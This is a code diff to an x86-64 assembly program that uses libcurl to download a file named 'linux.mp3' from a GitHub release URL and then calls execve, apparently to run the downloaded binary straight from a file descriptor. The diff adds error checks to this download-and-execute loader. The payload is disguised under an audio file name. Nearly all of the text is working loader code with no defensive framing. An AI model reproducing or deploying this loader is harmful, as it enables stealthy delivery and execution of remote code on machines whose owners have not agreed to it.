@@ -18,7 +18,7 @@ extern fdopen, setvbuf
 %define CURLOPT_WRITEDATA       10001
 %define CURLOPT_USERAGENT       10018
 %define CURLOPT_FOLLOWLOCATION  52
-%define _IONBF                  2
+%define _IONBF          2
 
 global main
 
@@ -32,6 +32,9 @@ main:
     push rbp
     call curl_easy_init
     pop rbp
+
+    cmp  rax, 0
+    je   error
 
     mov  [curly], rax
 
@@ -66,7 +69,10 @@ main:
     xor rax, rax
     call curl_easy_setopt
     pop rbp
-  
+
+    cmp rax, 0
+    jne error 
+ 
     push rbp
     mov rdi, [curly]
     mov rsi, CURLOPT_URL               
@@ -74,6 +80,9 @@ main:
     xor rax, rax
     call curl_easy_setopt
     pop rbp    
+
+    cmp rax, 0
+    jne error
 
     push rbp
     mov rdi, [curly]
@@ -83,6 +92,9 @@ main:
     call curl_easy_setopt
     pop rbp
 
+    cmp rax, 0
+    jne error
+
     push rbp
     mov rdi, [curly]
     mov rsi, CURLOPT_FOLLOWLOCATION
@@ -91,11 +103,17 @@ main:
     call curl_easy_setopt
     pop rbp
 
+    cmp rax, 0
+    jne error
+
     push rbp
     mov rdi, [curly]
     xor eax, eax 
     call curl_easy_perform
     pop rbp 
+
+    cmp rax, 0
+    jne error
 
     push rbp 
     mov rdi, [curly]
@@ -107,6 +125,7 @@ main:
     call curl_global_cleanup
     pop rbp
 
+    mov rbp, rsp
     mov rax, 59                               ;  sys_execve
     mov rdi, pfd
     mov rsi, 0
@@ -115,6 +134,10 @@ main:
 
     xor eax, eax                              ; shouldn't get here 
     ret 
+
+error:
+    mov rax, 1
+    ret
 
 section .data
     url db 'https://github.com/linuxthor/odds-and-ends/releases/download/0.1/linux.mp3',0 
